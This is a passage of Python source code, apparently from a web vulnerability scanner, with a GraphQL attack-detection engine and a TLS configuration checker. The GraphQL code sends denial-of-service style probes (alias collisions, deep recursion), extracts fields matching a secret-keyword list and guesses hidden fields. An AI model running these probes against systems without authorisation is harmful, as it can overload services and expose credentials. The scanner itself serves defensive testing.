                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"XPath 检测异常: {e}")

        return None


# ============================================================

# 从 graphql.py 合并


# ============================================================

# engines/graphql.py
"""
GraphQL 攻击检测引擎 - 重构版
功能：
1. GraphQL 端点自动发现
2. 内省查询检测（获取完整 Schema）
3. 别名碰撞攻击（资源耗尽检测）
4. 递归查询攻击（深度嵌套检测）
5. 批量字段提取（数据过量检测）
6. 敏感字段提取（基于内省结果）
7. 深度嵌套查询检测
"""


class GraphQLEngine(BaseEngine):
    name = "graphql"
    description = "GraphQL 攻击检测引擎"

    GRAPHQL_PATHS = [
        "/graphql", "/graphiql", "/playground", "/gql",
        "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/graphql/console", "/graphql/playground", "/api/graphql/console",
        "/query", "/api/query", "/graph", "/api/graph",
        "/graphql/explorer", "/explorer"
    ]

    INTROSPECTION_QUERIES = [
        'query { __schema { types { name } } }',
        'query { __schema { types { name fields { name type { name kind } } } } }',
        'query { __schema { mutationType { fields { name } } } }',
        'query { __schema { subscriptionType { fields { name } } } }',
        'query { __schema { queryType { fields { name type { name kind } } } } }',
        'query { __schema { types { name kind description fields { name type { name kind ofType { name kind } } } } } }',
    ]

    COMMON_FIELDS = [
        "id", "name", "email", "phone", "address", "age", "gender",
        "username", "firstName", "lastName", "title", "description",
        "content", "status", "role", "permission", "token",
        "refreshToken", "expiresAt", "isActive", "isAdmin",
        "createdAt", "updatedAt", "deletedAt", "version",
        "price", "quantity", "total", "subtotal", "tax",
        "currency", "locale", "timezone", "language",
        "profile", "avatar", "picture", "photo", "image",
        "url", "link", "slug", "path", "route",
        "type", "category", "tag", "label", "value",
        "count", "limit", "offset", "page", "size",
        "order", "sort", "filter", "search", "query",
    ]

    SENSITIVE_FIELD_KEYWORDS = [
        "password", "secret", "token", "key", "api_key",
        "credit", "card", "ssn", "social", "private",
        "internal", "admin", "root", "privilege",
        "permission", "access", "auth", "credential",
        "hash", "salt", "iv", "cipher", "encrypt",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if await self._is_graphql_endpoint(url, session):
            return {
                'url': url,
                'type': 'GraphQL 端点发现',
                'ai_verdict': '信息',
                'evidence': f'发现 GraphQL 端点: {url}',
                'diff_ratio': 0.0,
                'is_endpoint': True
            }
        return None

    async def _is_graphql_endpoint(self, url: str, session) -> bool:
        url_lower = url.lower()
        if any(path in url_lower for path in self.GRAPHQL_PATHS):
            return True

        try:
            resp = await async_post(
                url,
                json={"query": "query { __typename }"},
                session=session,
                timeout=5
            )
            if isinstance(resp, tuple):
                text = resp[1]
                status = resp[0]
            else:
                text = await resp.text()
                status = resp.status

            if status == 200 and ('__typename' in text or 'data' in text):
                return True
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return False

    async def discover_endpoints(
        self,
        base_url: str,
        session
    ) -> List[str]:
        endpoints = []
        base = base_url.rstrip('/')

        for path in self.GRAPHQL_PATHS:
            test_url = base + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status = resp[0]
                    resp[1]
                else:
                    status = resp.status
                    await resp.text()

                if status in (200, 400, 405):
                    test_resp = await async_post(
                        test_url,
                        json={"query": "query { __typename }"},
                        session=session,
                        timeout=5
                    )
                    if isinstance(test_resp, tuple):
                        test_text = test_resp[1]
                        test_status = test_resp[0]
                    else:
                        test_text = await test_resp.text()
                        test_status = test_resp.status

                    if test_status in (200, 400) and ('__typename' in test_text or 'data' in test_text or 'graphql' in test_text.lower()):
                        endpoints.append(test_url)
                        logger.info(f"🎯 发现 GraphQL 端点: {test_url}")
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return endpoints

    def _introspection_queries(self) -> List[str]:
        """F: GraphQL 查询深度上限（settings.graphql_max_depth）。
        在原有查询基础上追加一个按上限深度展开的内省查询，避免无界深递归导致目标过载。"""
        from vulnclaw.config.settings import settings
        queries = list(self.INTROSPECTION_QUERIES)
        depth = int(getattr(settings, "graphql_max_depth", 8) or 8)
        depth = max(1, min(depth, 12))
        layer = "type { name kind }"
        for _ in range(depth - 1):
            layer = f"type {{ name kind ofType {{ {layer} }} }}"
        queries.insert(0, f"query {{ __schema {{ types {{ name {layer} }} }} }}")
        return queries

    async def test_introspection(
        self,
        endpoint: str,
        session
    ) -> Dict:
        result = {
            "enabled": False,
            "schema": None,
            "type_count": 0,
            "field_count": 0,
            "query_fields": [],
            "mutation_fields": [],
            "subscription_fields": []
        }

        for query in self._introspection_queries():
            try:
                resp = await async_post(
                    endpoint,
                    json={"query": query},
                    session=session,
                    timeout=10
                )

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status == 200:
                    try:
                        data = json.loads(text)
                        if '__schema' in data.get('data', {}):
                            result["enabled"] = True
                            result["schema"] = data['data']['__schema']
                            types = data['data']['__schema'].get('types', [])
                            result["type_count"] = len(types)

                            query_type = data['data']['__schema'].get('queryType', {})
                            if query_type:
                                for t in types:
                                    if t.get('name') == query_type.get('name'):
                                        result["query_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        result["field_count"] = len(result["query_fields"])
                                        break

                            mutation_type = data['data']['__schema'].get('mutationType', {})
                            if mutation_type:
                                for t in types:
                                    if t.get('name') == mutation_type.get('name'):
                                        result["mutation_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        break

                            subscription_type = data['data']['__schema'].get('subscriptionType', {})
                            if subscription_type:
                                for t in types:
                                    if t.get('name') == subscription_type.get('name'):
                                        result["subscription_fields"] = [
                                            f.get('name') for f in t.get('fields', [])
                                            if f.get('name') and not f.get('name').startswith('__')
                                        ]
                                        break

                            logger.info(f"   📊 内省开启: {result['type_count']} 个类型, {result['field_count']} 个查询字段")
                            break
                    except BaseException:
                        logger.debug("suppressed exception (engine audit)")
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return result

    async def test_alias_collision(
        self,
        endpoint: str,
        session,
        alias_count: int = 100
    ) -> Optional[Dict]:
        aliases = " ".join([f"a{i}: __typename" for i in range(alias_count)])
        query = f"query {{ {aliases} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'errors' in data:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 别名碰撞攻击',
                        'severity': 'Medium',
                        'evidence': f'{alias_count} 个别名查询返回错误: {data.get("errors", [{}])[0].get("message", "")[:100]}',
                        'elapsed': elapsed,
                        'recommendation': '限制别名数量或使用查询复杂度分析'
                    }
                elif elapsed > 5:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 别名碰撞攻击（性能问题）',
                        'severity': 'Low',
                        'evidence': f'{alias_count} 个别名查询耗时 {elapsed:.1f}s',
                        'elapsed': elapsed,
                        'recommendation': '启用查询复杂度限制'
                    }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 别名碰撞攻击（超时）',
                'severity': 'High',
                'evidence': f'{alias_count} 个别名查询导致超时，存在 DoS 风险',
                'recommendation': '限制别名数量，启用查询超时'
            }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_recursive_query(
        self,
        endpoint: str,
        session,
        depth: int = 10
    ) -> Optional[Dict]:
        recursive = "friends { name "
        for i in range(2, depth + 1):
            recursive += "friends { name "
        recursive += "} " * depth

        query = f"query {{ user(id: 1) {{ {recursive} }} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'errors' in data:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击',
                        'severity': 'Medium',
                        'evidence': f'{depth} 层递归查询返回错误: {data.get("errors", [{}])[0].get("message", "")[:100]}',
                        'elapsed': elapsed,
                        'recommendation': '限制查询深度'
                    }
                elif 'user' in data.get('data', {}):
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击（无深度限制）',
                        'severity': 'High',
                        'evidence': f'{depth} 层递归查询成功返回，耗时 {elapsed:.2f}s，存在 DoS 风险',
                        'elapsed': elapsed,
                        'recommendation': '设置最大查询深度限制'
                    }
                elif elapsed > 8:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 递归查询攻击（性能问题）',
                        'severity': 'Medium',
                        'evidence': f'{depth} 层递归查询耗时 {elapsed:.1f}s',
                        'elapsed': elapsed,
                        'recommendation': '限制查询深度'
                    }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 递归查询攻击（超时）',
                'severity': 'High',
                'evidence': f'{depth} 层递归查询导致超时，存在 DoS 风险',
                'recommendation': '设置最大查询深度限制'
            }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_batch_field_extraction(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None
    ) -> Optional[Dict]:
        if introspection_result and introspection_result.get('enabled'):
            query_fields = introspection_result.get('query_fields', [])
            if query_fields:
                fields = [f for f in query_fields if f and not f.startswith('__')][:30]
                if len(fields) >= 5:
                    fields_str = " ".join(fields[:25])
                    query = f"query {{ {fields_str} }}"
                    logger.info(f"   📦 批量提取 {len(fields[:25])} 个字段: {fields[:5]}...")
                    return await self._send_batch_query(endpoint, query, session, fields)

        common_fields = self.COMMON_FIELDS[:25]
        fields_str = " ".join(common_fields)
        query = f"query {{ user(id: 1) {{ {fields_str} }} }}"
        return await self._send_batch_query(endpoint, query, session, common_fields)

    async def _send_batch_query(
        self,
        endpoint: str,
        query: str,
        session,
        fields: List[str]
    ) -> Optional[Dict]:
        try:
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=15
            )

            if isinstance(resp, tuple):
                status = resp[0]
                text = resp[1]
            else:
                status = resp.status
                text = await resp.text()

            if status == 200:
                data = json.loads(text)
                if 'data' in data:
                    returned_count = len(data['data'])
                    if returned_count > 10:
                        return {
                            'url': endpoint,
                            'type': 'GraphQL 批量字段提取（数据过量）',
                            'severity': 'Medium',
                            'evidence': f'一次查询返回 {returned_count} 个字段，可能存在数据过度提取',
                            'fields': fields[:10],
                            'recommendation': '限制单次查询返回字段数量，使用查询复杂度分析'
                        }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_sensitive_field_extraction(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None
    ) -> Optional[Dict]:
        if not introspection_result or not introspection_result.get('enabled'):
            return None

        sensitive_fields = []
        types = introspection_result.get('schema', {}).get('types', [])

        for t in types:
            type_name = t.get('name', '').lower()
            if any(kw in type_name for kw in ['user', 'account', 'profile', 'admin', 'setting', 'config']):
                for field in t.get('fields', []):
                    field_name = field.get('name', '').lower()
                    if any(kw in field_name for kw in self.SENSITIVE_FIELD_KEYWORDS):
                        sensitive_fields.append(field.get('name'))

        if sensitive_fields:
            fields_str = " ".join(sensitive_fields[:15])
            query = f"query {{ user(id: 1) {{ {fields_str} }} }}"

            try:
                resp = await async_post(
                    endpoint,
                    json={"query": query},
                    session=session,
                    timeout=10
                )

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status == 200:
                    data = json.loads(text)
                    if 'data' in data:
                        user_data = data['data'].get('user', {})
                        returned_sensitive = [
                            k for k in user_data.keys()
                            if any(kw in k.lower() for kw in self.SENSITIVE_FIELD_KEYWORDS)
                        ]
                        if returned_sensitive:
                            return {
                                'url': endpoint,
                                'type': 'GraphQL 敏感字段泄露',
                                'severity': 'High',
                                'evidence': f'成功提取敏感字段: {", ".join(returned_sensitive[:5])}',
                                'fields': returned_sensitive,
                                'recommendation': '禁止查询敏感字段，使用权限控制'
                            }
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def test_deep_nesting(
        self,
        endpoint: str,
        session,
        depth: int = 8
    ) -> Optional[Dict]:
        nesting = "user { "
        for i in range(depth):
            nesting += "profile { "
        nesting += "name "
        nesting += "} " * depth

        query = f"query {{ {nesting} }}"

        try:
            start_time = asyncio.get_event_loop().time()
            resp = await async_post(
                endpoint,
                json={"query": query},
                session=session,
                timeout=30
            )
            elapsed = asyncio.get_event_loop().time() - start_time

            if isinstance(resp, tuple):
                resp[0]
            else:
                pass

            if elapsed > 10:
                return {
                    'url': endpoint,
                    'type': 'GraphQL 深度嵌套攻击（性能问题）',
                    'severity': 'Medium',
                    'evidence': f'{depth} 层嵌套查询耗时 {elapsed:.1f}s',
                    'elapsed': elapsed,
                    'recommendation': '设置最大查询深度限制'
                }
        except asyncio.TimeoutError:
            return {
                'url': endpoint,
                'type': 'GraphQL 深度嵌套攻击（超时）',
                'severity': 'High',
                'evidence': f'{depth} 层嵌套查询导致超时，存在 DoS 风险',
                'recommendation': '设置最大查询深度限制'
            }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_suggestions_leak(
        self,
        endpoint: str,
        session,
    ) -> Optional[Dict]:
        """A5-2：字段建议泄漏（suggestions）——未知字段报错若回显 suggestions / Did you mean，
        可辅助攻击者枚举 Schema，属信息泄露。"""
        query = "query { nonexistentfieldzzz }"
        try:
            resp = await async_post(endpoint, json={"query": query}, session=session, timeout=10)
            if isinstance(resp, tuple):
                status, text = resp[0], resp[1]
            else:
                status, text = resp.status, await resp.text()
            if status != 200 or not isinstance(text, str):
                return None
            data = json.loads(text)
            for err in (data.get("errors") or []):
                suggestions = (err.get("extensions") or {}).get("suggestions")
                message = str(err.get("message", ""))
                if suggestions:
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 字段建议泄漏(suggestions)',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f'未知字段报错回显 suggestions: {suggestions[:5]} —— 可辅助枚举 Schema',
                        'recommendation': '关闭 GraphQL 错误中的字段建议（禁止回显 suggestions/Did you mean）',
                    }
                if 'did you mean' in message.lower():
                    return {
                        'url': endpoint,
                        'type': 'GraphQL 字段建议泄漏(suggestions)',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'confidence': 'low',
                        'evidence': f'未知字段报错包含字段建议提示: {message[:120]}',
                        'recommendation': '关闭 GraphQL 错误中的字段建议（禁止回显 suggestions/Did you mean）',
                    }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_mutation_idor(
        self,
        endpoint: str,
        session,
        introspection_result: Dict = None,
    ) -> Optional[Dict]:
        """A5-4：alias-based mutation 滥用面检测。仅当内省暴露 update/create/delete 类 mutation 字段时，
        尝试单次请求内用两个 alias 复用同一 mutation（不同标量参数，非破坏性——无效参数在执行前被校验拒绝），
        若两者均被返回且无错误，说明存在单请求批量变更/限流绕过面，需人工确认授权。"""
        if not introspection_result or not introspection_result.get('enabled'):
            return None
        mutation_fields = introspection_result.get('mutation_fields') or []
        target = next((f for f in mutation_fields
                       if any(k in f.lower() for k in ('update', 'create', 'delete', 'add', 'remove', 'set'))),
                      None)
        if not target:
            return None
        query = (
            "mutation {"
            f" a: {target}(dummy: 1) {{ __typename }}"
            f" b: {target}(dummy: 2) {{ __typename }}"
            " }"
        )
        try:
            resp = await async_post(endpoint, json={"query": query}, session=session, timeout=10)
            if isinstance(resp, tuple):
                status, text = resp[0], resp[1]
            else:
                status, text = resp.status, await resp.text()
            if status != 200 or not isinstance(text, str):
                return None
            data = json.loads(text)
            if 'errors' in data:
                return None
            mut = data.get('data', {}).get(target)
            if isinstance(mut, dict) and 'a' in mut and 'b' in mut:
                return {
                    'url': endpoint,
                    'type': 'GraphQL alias 批量变更(越权/限流绕过面)',
                    'severity': 'Low',
                    'ai_verdict': '中',
                    'confidence': 'low',
                    'evidence': f'单次请求内两个 alias 复用 mutation `{target}` 均被执行，存在批量操作/限流绕过面，需人工确认授权',
                    'recommendation': '对 mutation 做单请求操作数限制与逐操作授权校验',
                }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def test_without_introspection(
        self,
        endpoint: str,
        session,
    ) -> Optional[Dict]:
        """内省关闭时：基于常见字段名清单做字段猜解，探测可访问的隐藏字段。

        内省关闭(data-fetching 或 __schema 返回错误)时无法枚举 schema，攻击者仍可
        通过猜解 get/currentUser/user/me/admin/secret 等常见字段名探测暴露面。本方法
        复用猜解清单逐一构造最小查询，能成功且返回 data 即暴露可猜解字段。"""
        guess_fields = [
            "me", "user", "currentUser", "viewer", "admin", "users", "usersList",
            "account", "profile", "config", "settings", "debug", "secret",
            "token", "apiKey", "invite", "login", "register", "logout",
            "health", "version", "status", "info",
        ]
        probes = []
        for field in guess_fields:
            query = f"{{ {field} {{ __typename }} }}"
            try:
                resp = await async_post(endpoint, json={"query": query}, session=session, timeout=8)
                if isinstance(resp, tuple):
                    status, text = resp[0], resp[1]
                else:
                    status, text = resp.status, await resp.text()
                if status != 200 or not isinstance(text, str):
                    continue
                data = json.loads(text)
                # 无 data 键(内省关闭返回) 或 data 为 null 都不是可访问字段
                node = (data.get("data") or {}).get(field)
                if isinstance(node, dict) and node.get("__typename"):
                    probes.append(field)
            except Exception:
                continue
        if not probes:
            return None
        return {
            "url": endpoint,
            "type": "GraphQL 内省关闭-字段猜解暴露",
            "severity": "Medium",
            "ai_verdict": "中",
            "confidence": "medium",
            "evidence": "内省已关闭但通过常见字段名猜解命中可访问字段: " + ", ".join(sorted(probes)),
            "recommendation": "对 GraphQL 字段做白名单授权控制，避免暴露敏感查询字段",
            "guessed_fields": sorted(probes),
        }

    async def scan(
        self,
        target: str,
        session,
        **kwargs
    ) -> List[Dict]:
        findings = []

        endpoints = await self.discover_endpoints(target, session)

        if not endpoints:
            logger.info("ℹ️ 未发现 GraphQL 端点，跳过检测")
            return findings

        logger.info(f"🔍 发现 {len(endpoints)} 个 GraphQL 端点")

        for endpoint in endpoints:
            logger.info(f"📊 测试 GraphQL 端点: {endpoint}")

            introspection = await self.test_introspection(endpoint, session)

            if introspection.get('enabled'):
                findings.append({
                    'url': endpoint,
                    'type': 'GraphQL 内省开启',
                    'severity': 'Medium',
                    'evidence': f'内省查询返回 {introspection["type_count"]} 个类型, {introspection["field_count"]} 个查询字段',
                    'recommendation': '在生产环境禁用内省',
                    'introspection': introspection
                })

            result = await self.test_alias_collision(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_recursive_query(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_batch_field_extraction(endpoint, session, introspection)
            if result:
                findings.append(result)

            if introspection.get('enabled'):
                result = await self.test_sensitive_field_extraction(endpoint, session, introspection)
                if result:
                    findings.append(result)

            result = await self.test_deep_nesting(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_suggestions_leak(endpoint, session)
            if result:
                findings.append(result)

            result = await self.test_mutation_idor(endpoint, session, introspection)
            if result:
                findings.append(result)

            if not introspection.get('enabled'):
                result = await self.test_without_introspection(endpoint, session)
                if result:
                    findings.append(result)

        logger.info(f"✅ GraphQL 扫描完成，发现 {len(findings)} 个问题")
        return findings


# ============================================================
# TLS/SSL 传输层安全检测引擎
# 说明：传输层配置与 URL 参数无关，属全局引擎（由 V100 global_scan 调度）。
# 检测面（CWE-295/326/327）：
#   1. 服务端支持的最高协议版本（SSLv3 / TLSv1.0 / TLSv1.1 均已废弃）
#   2. 是否仍接受已废弃协议握手（RFC 8996 要求禁用）
#   3. 协商出的加密套件是否为弱套件（RC4/3DES/NULL/EXPORT/anon/MD5）
#   4. 证书有效性：过期 / 自签名 / 主机名不匹配 / 链不完整 / 即将过期
# ============================================================


class TlsSecurityEngine(BaseEngine):
    """TLS/SSL 传输层安全配置检测引擎"""

    name = "tls_security"
    description = "TLS/SSL 传输层安全检测（废弃协议 / 弱加密套件 / 证书无效或过期）"

    # 弱/废弃密码套件特征（对套件名做小写包含匹配）
    WEAK_CIPHER_KEYWORDS = (
        "rc4", "3des", "des-cbc", "null", "export", "anon", "md5", "idea", "seed",
    )
    # 命中即视为严重（无加密 / 可降级到导出级 / 匿名）
    CRITICAL_CIPHER_KEYWORDS = ("null", "export", "anon")
    # 已废弃协议（RFC 8996 要求禁用）
    LEGACY_PROTOCOLS = ("TLSv1", "TLSv1.1")

    EXPIRE_WARN_DAYS = 30
    CONNECT_TIMEOUT = 8

    _VERSION_RANK = {
        "SSLv2": 0, "SSLv3": 1, "TLSv1": 2,
        "TLSv1.1": 3, "TLSv1.2": 4, "TLSv1.3": 5,
    }

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """参数级入口：TLS 配置与 URL 参数无关，统一走 scan() 全局扫描。"""
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        """扫描目标 TLS/SSL 配置（目标级；host:443 不可达时静默跳过，避免误报）。"""
        findings: List[Dict] = []
        host, port = self._resolve_endpoint(target)
        if not host:
            return findings

        try:
            negotiated = await asyncio.wait_for(
                self._handshake(host, port), timeout=self.CONNECT_TIMEOUT
            )
        except Exception as exc:
            # 目标未提供 TLS 服务（纯 HTTP / 端口未开放）属正常情况，不产生误报
            logger.info(f"TLS 检测跳过：{host}:{port} 无可用 TLS 服务（{exc}）")
            return findings

        version = negotiated.get("version") or ""
        cipher = negotiated.get("cipher") or ""
        highest, legacy_supported = await self._probe_protocol_support(host, port)

        if highest and self._version_rank(highest) < self._version_rank("TLSv1.2"):
            findings.append(self._finding(
                target,
                "tls_legacy_only",
                "TLS 最高协议版本过低（仅支持废弃协议）",
                "High",
                7.4,
                f"服务端支持的最高 TLS 版本为 {highest}，低于 TLSv1.2，"
                f"暴露 BEAST/POODLE 等已知协议缺陷攻击面。",
                f"服务端最高支持协议: {highest}",
                "禁用 SSLv3/TLSv1.0/TLSv1.1，仅启用 TLSv1.2 及以上（优先 TLSv1.3）。",
            ))

        if legacy_supported:
            findings.append(self._finding(
                target,
                "tls_legacy_protocol_enabled",
                "服务端仍接受已废弃 TLS 协议",
                "Medium",
                5.9,
                f"服务端仍可与以下已废弃协议完成握手: {', '.join(legacy_supported)}，"
                f"RFC 8996 已要求禁用 TLSv1.0/TLSv1.1。",
                f"可接受废弃协议: {', '.join(legacy_supported)}；当前协商协议: {version}",
                "关闭 TLSv1.0/TLSv1.1（如 Nginx: ssl_protocols TLSv1.2 TLSv1.3;）。",
            ))

        lowered = cipher.lower()
        weak_hits = [k for k in self.WEAK_CIPHER_KEYWORDS if k in lowered]
        if weak_hits:
            critical = any(k in lowered for k in self.CRITICAL_CIPHER_KEYWORDS)
            findings.append(self._finding(
                target,
                "tls_weak_cipher",
                "TLS 协商使用弱加密套件",
                "High" if critical else "Medium",
                7.4 if critical else 5.9,
                f"协商出的加密套件 {cipher} 命中弱算法特征: {', '.join(weak_hits)}。"
                + ("（NULL/EXPORT/匿名套件等同未加密通信，可被直接解密或降级。）" if critical else ""),
                f"协商套件: {cipher}（协议 {version}）",
                "禁用 NULL/EXPORT/RC4/3DES 等弱套件，优先 AEAD 套件（AES-GCM / ChaCha20-Poly1305）。",
            ))

        findings.extend(await self._verify_certificate(host, port, target))

        logger.info(
            f"TLS 安全检测完成：{host}:{port} 协商 {version}/{cipher}，"
            f"最高支持 {highest or 'N/A'}，发现 {len(findings)} 个问题"
        )
        return findings

    # ---------- 内部实现 ----------

    def _resolve_endpoint(self, target: str) -> Tuple[str, int]:
        """解析出用于 TLS 握手的 host/port（统一探测 443，除非目标显式指定了端口）。"""
        raw = (target or "").strip()
        if not raw:
            return "", 0
        if "://" not in raw:
            raw = "https://" + raw
        parsed = urlparse(raw)
        host = parsed.hostname or ""
        if not host:
            return "", 0
        return host, parsed.port or 443

    async def _handshake(
        self,
        host: str,
        port: int,
        verify: bool = False,
        minimum=None,
        maximum=None,
        allow_legacy: bool = False,
    ) -> Dict:
        """与服务端完成一次 TLS 握手，返回协商出的协议版本 / 套件 / 证书信息。

        verify=True 时使用系统默认信任库做完整证书链校验；
        minimum/maximum 用于探测服务端对特定协议版本的支持情况；
        allow_legacy=True 时降低 OpenSSL 安全级别（SECLEVEL=0），
        避免本地 OpenSSL 策略拦掉对 TLSv1.0/1.1 的探测（否则废弃协议永远检不出）。
        """
        if verify:
            ctx = ssl.create_default_context()
        else:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        if allow_legacy:
            try:
                ctx.set_ciphers("DEFAULT@SECLEVEL=0")
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        if minimum is not None:
            ctx.minimum_version = minimum
        if maximum is not None:
            ctx.maximum_version = maximum

        _reader, writer = await asyncio.open_connection(
            host, port, ssl=ctx, server_hostname=host
        )
        try:
            sslobj = writer.get_extra_info("ssl_object")
            if sslobj is None:
                transport = getattr(writer, "transport", None)
                sslobj = transport.get_extra_info("ssl_object") if transport else None
            version = sslobj.version() if sslobj else ""
            cipher_info = sslobj.cipher() if sslobj else None
            cert = sslobj.getpeercert() if sslobj else None
            return {
                "version": version or "",
                "cipher": (cipher_info[0] if cipher_info else "") or "",
                "cert": cert or {},
                "der": (sslobj.getpeercert(binary_form=True) if sslobj else b"") or b"",
            }
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                logger.debug("suppressed exception (engine audit)")

    async def _probe_protocol_support(self, host: str, port: int) -> Tuple[str, List[str]]:
        """逐版本探测：返回（支持的最高协议, 仍可成功握手的废弃协议列表）。"""
        highest = ""
        legacy: List[str] = []
        candidates = (
            ("TLSv1.3", getattr(ssl.TLSVersion, "TLSv1_3", None)),
            ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
            ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
            ("TLSv1", ssl.TLSVersion.TLSv1),
        )
        for label, ver in candidates:
            if ver is None:
                continue
            try:
                await asyncio.wait_for(
                    self._handshake(
                        host, port, minimum=ver, maximum=ver,
                        allow_legacy=label in self.LEGACY_PROTOCOLS,
                    ),
                    timeout=self.CONNECT_TIMEOUT,
                )
            except Exception:
                # 该版本不被服务端支持，或被本地 OpenSSL 安全策略禁用
                continue
            if not highest:
                highest = label
            if label in self.LEGACY_PROTOCOLS:
                legacy.append(label)
        return highest, legacy

    async def _verify_certificate(self, host: str, port: int, url: str) -> List[Dict]:
        """校验服务器证书：过期 / 即将过期 / 自签名 / 主机名不匹配 / 链不可信。

        优先解析证书真实字段（cryptography，无则回退 CPython 内置解码器），
        避免只依赖 OpenSSL 错误文案 —— 链错误会掩盖“证书已过期”这类真实问题。
        """
        findings: List[Dict] = []
        info = await self._cert_info(host, port)

        not_after_ts = info.get("not_after_ts")
        if not_after_ts is not None:
            days_left = (not_after_ts - time.time()) / 86400.0
            if days_left <= 0:
                findings.append(self._finding(
                    url, "tls_cert_expired", "TLS 证书已过期", "High", 7.4,
                    "服务端证书已过有效期，客户端无法验证服务身份，存在中间人攻击风险。",
                    f"{host}:{port} 证书有效期截止: {info.get('not_after_text') or 'N/A'}",
                    "立即续签并部署有效证书，配置到期前自动轮换。",
                ))
            elif days_left <= self.EXPIRE_WARN_DAYS:
                findings.append(self._finding(
                    url, "tls_cert_expiring", "TLS 证书即将过期", "Low", 3.7,
                    f"证书将在 {days_left:.0f} 天内过期，需提前安排续签以避免服务中断。",
                    f"{host}:{port} 证书有效期截止: {info.get('not_after_text') or 'N/A'}"
                    f"（剩余 {days_left:.0f} 天）",
                    "在到期前完成证书续签，建议配置自动轮换与到期告警。",
                ))

        if info.get("self_signed"):
            findings.append(self._finding(
                url, "tls_cert_self_signed", "TLS 证书为自签名", "Medium", 5.9,
                "服务端使用自签名证书，无法建立可信身份，通信易被中间人劫持。",
                f"{host}:{port} 证书的签发者(issuer)与主体(subject)相同，为自签名证书",
                "改用受信任 CA 签发的证书（内网可使用私有 CA 并下发根证书）。",
            ))

        sans = info.get("sans") or []
        if sans and not self._host_matches(host, sans):
            findings.append(self._finding(
                url, "tls_cert_hostname_mismatch", "TLS 证书主机名不匹配", "Medium", 5.9,
                "证书绑定的域名与访问主机名不一致，证书校验无法通过。",
                f"访问主机 {host} 未出现在证书 SAN 列表中: {', '.join(sans[:8])}",
                "为实际访问域名签发包含正确 SAN 的证书。",
            ))

        # 已定位到具体证书问题时不叠加“链不可信”（后者通常是这些问题的结果）
        if any(f["type"] != "tls_cert_expiring" for f in findings):
            return findings

        chain_error = await self._chain_verify_error(host, port)
        if not chain_error:
            return findings

        msg = chain_error.lower()
        if "expired" in msg:
            ftype, title, severity, cvss = "tls_cert_expired", "TLS 证书已过期", "High", 7.4
            desc = "服务端证书不在有效期内，客户端无法验证服务身份。"
            fix = "及时续签并部署有效证书，配置到期前自动轮换。"
        elif "self" in msg and "sign" in msg:
            ftype, title = "tls_cert_self_signed", "TLS 证书为自签名"
            severity, cvss = "Medium", 5.9
            desc = "服务端使用自签名证书，无法建立可信身份。"
            fix = "改用受信任 CA 签发的证书。"
        elif "hostname" in msg or "match" in msg or "altname" in msg:
            ftype, title = "tls_cert_hostname_mismatch", "TLS 证书主机名不匹配"
